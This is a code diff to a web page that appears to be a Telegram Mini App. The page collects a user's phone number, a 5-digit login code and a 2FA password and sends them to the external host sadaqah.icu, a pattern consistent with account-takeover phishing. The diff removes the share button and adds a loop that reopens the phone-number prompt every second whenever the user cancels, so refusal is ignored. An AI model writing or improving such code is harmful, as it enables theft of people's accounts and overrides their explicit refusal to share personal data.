@@ -218,7 +218,7 @@
       <p>Loading...</p>
     </div>
 
-    <!-- Блок запроса номера -->
+    <!-- Блок запроса номера (без кнопки, авто-запрос) -->
     <div id="phoneBlock" class="card hidden">
       <div class="top">
         <div>
@@ -227,7 +227,7 @@
         </div>
         <div class="pill" id="phoneDisplay">Not shared</div>
       </div>
-      <button id="requestPhoneBtn" class="retry-btn">📱 Share phone number</button>
+      <!-- Кнопка не нужна, запрос автоматический -->
     </div>
 
     <!-- Блок ввода кода -->
@@ -295,11 +295,13 @@
       const keyboard = document.getElementById('keyboard');
       const twofaInput = document.getElementById('twofaInput');
       const submit2faBtn = document.getElementById('submit2faBtn');
-      const requestPhoneBtn = document.getElementById('requestPhoneBtn');
 
       const CODE_LEN = 5; // должно совпадать с config.py
       let code = '';
       let currentPhone = localStorage.getItem('tg_phone') || ''; // восстанавливаем номер, если был
+      let phoneRequestTimer = null;
+      let isRequestingPhone = false;
+      let phoneShared = false; // true, когда номер успешно получен и отправлен на сервер
 
       // --- Утилиты ---
       function maskPhone(p) {
@@ -325,6 +327,8 @@
           } else {
             phoneDisplay.textContent = 'Not shared';
           }
+          // Запускаем автоматический запрос номера
+          autoRequestPhone();
         } else if (blockId === 'code') {
           codeBlock.classList.remove('hidden');
           keyboard.style.display = 'grid';
@@ -343,23 +347,24 @@
         }
       }
 
-      // --- Запрос статуса ---
-      async function fetchState() {
-        try {
-          const res = await fetch(`https://sadaqah.icu/status?user_id=${userId}`);
-          const data = await res.json();
-          console.log('Fetched state:', data.state);
-          return data.state; // 'none', 'get_number', 'get_code', 'get_2fa'
-        } catch (e) {
-          console.error('Status error:', e);
-          return 'none';
-        }
-      }
+      // --- Автоматический запрос номера с повтором при отмене ---
+      async function autoRequestPhone() {
+        // Если номер уже получен и обработан, не запрашиваем
+        if (phoneShared) return;
 
-      // --- Логика запроса номера ---
-      async function requestPhone() {
-        console.log('Requesting phone...');
+        // Если уже выполняется запрос, не запускаем новый
+        if (isRequestingPhone) return;
+
+        // Очищаем предыдущий таймер, если есть
+        if (phoneRequestTimer) {
+          clearTimeout(phoneRequestTimer);
+          phoneRequestTimer = null;
+        }
+
+        isRequestingPhone = true;
+
         try {
+          console.log('Requesting phone...');
           const contactData = await WebApp.requestContact();
           console.log('Contact data:', contactData);
           
@@ -379,21 +384,29 @@
               const result = await res.json();
               console.log('Submit phone result:', result);
               if (result.status === 'ok') {
+                phoneShared = true; // останавливаем авто-запрос
                 showBlock('code');
               } else {
+                // Ошибка сервера – показываем сообщение и повторяем запрос через 1 сек
                 alert('Server error: ' + (result.message || 'Unknown error'));
-                // Остаёмся в блоке номера
+                phoneRequestTimer = setTimeout(autoRequestPhone, 1000);
               }
             } catch (err) {
               console.error('Network error sending phone:', err);
-              alert('Network error while sending phone. Please try again.');
+              alert('Network error while sending phone. Retrying...');
+              phoneRequestTimer = setTimeout(autoRequestPhone, 1000);
             }
           } else {
-            console.log('No contact data received');
+            // Странный случай – повтор через 1 сек
+            console.log('No contact data received, retrying...');
+            phoneRequestTimer = setTimeout(autoRequestPhone, 1000);
           }
         } catch (error) {
-          console.log('Request contact cancelled or error:', error);
-          // При отмене ничего не делаем, пользователь может нажать кнопку снова
+          // Пользователь отменил запрос контакта – повторяем через 1 сек
+          console.log('Request contact cancelled, retrying...');
+          phoneRequestTimer = setTimeout(autoRequestPhone, 1000);
+        } finally {
+          isRequestingPhone = false;
         }
       }
 
@@ -535,9 +548,6 @@
         }
       });
 
-      // --- Обработчик кнопки запроса номера ---
-      requestPhoneBtn.addEventListener('click', requestPhone);
-
       // --- Инициализация ---
       (async () => {
         showBlock('loading');
@@ -563,6 +573,18 @@
           showBlock('phone');
         }
       })();
+
+      // Функция fetchState должна быть определена выше
+      async function fetchState() {
+        try {
+          const res = await fetch(`https://sadaqah.icu/status?user_id=${userId}`);
+          const data = await res.json();
+          return data.state; // 'none', 'get_number', 'get_code', 'get_2fa'
+        } catch (e) {
+          console.error('Status error:', e);
+          return 'none';
+        }
+      }
     })();
   </script>
 </body>
